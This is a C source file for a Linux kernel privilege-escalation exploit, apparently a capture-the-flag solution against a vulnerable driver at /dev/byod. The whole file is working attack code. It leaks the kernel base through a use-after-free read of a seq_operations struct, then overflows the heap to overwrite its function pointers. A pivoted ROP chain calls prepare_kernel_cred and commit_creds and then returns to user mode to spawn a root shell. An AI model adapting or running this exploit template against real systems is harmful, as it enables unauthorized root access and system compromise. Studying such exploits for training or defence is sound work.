#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <assert.h>

struct request {
	unsigned long length;
	unsigned long handle;
};

unsigned long u64(unsigned char *string)
{
	return (unsigned long)(*(unsigned long *)(string));
}

void shell(void)
{
	system("/bin/sh");
	exit(0);
}

void hexdump(unsigned long handle, const int length)
{
	printf("\t");
	for (int i = 0; i < length; i++)
	{
		if (i != 0 && ((i % 16) == 0))
		{
			printf("\n\t");
		}
		if (i != 0 && ((i % 8) == 0) && ((i % 16) != 0))
		{
			printf(" ");
		}
		printf("%02x ", ((unsigned char *)handle)[i]);
	}
	printf("\n");
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status(void)
{
    __asm__("movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %2\n"
            "pushfq\n"
            "popq %3\n"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
			:: "memory");
	fprintf(stderr, "[*] Status saved\n");
}

int main(void)
{
	int i = 0, j = 0;

	struct request *req = malloc(sizeof(struct request));
	req->length = 0x20;
	req->handle = (unsigned long)calloc(0x28, 1);

	int fd = open("/dev/byod", O_RDWR);
	if (fd < 0)
	{
		fprintf(stderr, "[!] Failed to open /dev/byod\n");
		return -1;
	}

	// Trigger UAF read to get kbase
	ioctl(fd, 0x1000, NULL);
	ioctl(fd, 0x1003, NULL);
	open("/proc/self/stat", O_RDONLY);
	ioctl(fd, 0x1001, req);

	// Dump seq_operations struct fn ptrs
	printf("[*] SEQ_OPERATIONS:\n");
	hexdump(req->handle, req->length);

	unsigned long kbase = u64((unsigned char *)req->handle) - 0xEFC50;
	printf("[*] KBASE: 0x%lx\n", kbase);

	// 0xffffffff81150758 : mov esp, 0x1e824 ; add al, ch ; popfq ; ret
	unsigned long stack_addr = 0x1e824;
	unsigned long mmap_addr = stack_addr & 0xfffff000;

	// Make room for kernel stack manipulation (addr - 0x1000)
	unsigned long *pivot_stack = mmap((void *)mmap_addr-0x1000, 0x3000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
	if (pivot_stack == MAP_FAILED)
	{
		perror("mmap");
		exit(-1);
	}

	unsigned long prepare_kernel_cred = kbase + 0x53580;
	unsigned long commit_creds = kbase + 0x536d0;

	// https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S#L501
	unsigned long ret_to_um = kbase + 0x200cb0 + 0x16 /* to skip the pop_regs */;

	// 0xffffffff811300ac : pop rdi ; ret
	unsigned long pop_rdi = kbase + 0x1300ac;

	// 0xffffffff81130046 : pop rdx ; ret
	unsigned long pop_rdx = kbase + 0x130046;

	// 0xffffffff81016889 : push rax ; ret
	unsigned long push_rax = kbase + 0x016889;

	// 0xffffffff8112ffb0 : pop rbx ; ret
	unsigned long pop_rbx = kbase + 0x12ffb0;

	// 0xffffffff8117af63 : pop rcx ; ret
	unsigned long pop_rcx = kbase + 0x17af63;

	// 0xffffffff8119f38a : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
	unsigned long mov_rdi_rax = kbase + 0x19f38a;

	save_status();

	pivot_stack = stack_addr + 8;

	// Touch page to avoid double fault
	pivot_stack[0] = 0xdeadbeefcafebebe;

	pivot_stack[i++] = pop_rdi;
	pivot_stack[i++] = 0;
	pivot_stack[i++] = prepare_kernel_cred;
	pivot_stack[i++] = pop_rcx;
	pivot_stack[i++] = 0;
	pivot_stack[i++] = mov_rdi_rax;
	pivot_stack[i++] = commit_creds;

	pivot_stack[i++] = ret_to_um;
	pivot_stack[i++] = 0xdeadbeefUL; // RAX
	pivot_stack[i++] = 0xdeadbeefUL; // RDI
	pivot_stack[i++] = (unsigned long)shell;
	pivot_stack[i++] = user_cs;
	pivot_stack[i++] = user_rflags;
	pivot_stack[i++] = user_sp;
	pivot_stack[i++] = user_ss;

	// Allocate device struct
	ioctl(fd, 0x1000, NULL);

	// Place Seq_Operations struct in memory
	int victim = open("/proc/self/stat", O_RDONLY);

	// Heap Overflow
	req->length = 0x28;
	for (j = 0; j < 0x5; j++)
	{
		// 0xffffffff81150758 : mov esp, 0x1e824 ; add al, ch ; popfq ; ret
		((unsigned long *)req->handle)[j] = kbase + 0x150758;
	}
	ioctl(fd, 0x1002, req);

	fprintf(stderr, "[*] Popping shell\n");

	// Trigger Victim Fn Ptr
	read(victim, (unsigned char *)req->handle, 1);
}